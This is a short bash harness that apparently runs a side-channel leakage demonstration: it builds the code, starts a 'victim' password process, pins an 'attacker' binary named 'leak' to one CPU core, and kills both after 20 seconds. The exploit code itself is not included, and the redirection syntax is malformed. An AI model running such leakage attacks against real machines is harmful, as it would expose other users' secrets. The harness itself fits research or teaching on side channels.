# !/bin/bash
make

./passwd.sh "5" &1>/dev/null
VICTIM_PID=$!

sleep 1

taskset -c "1" ./leak &1>/dev/null
ATTACKER_PID=$!


sleep 20
kill $ATTACKER_PID 2>/dev/null || true
wait $ATTACKER_PID 2>/dev/null || true

kill $VICTIM_PID 2>/dev/null || true
wait $VICTIM_PID 2>/dev/null || true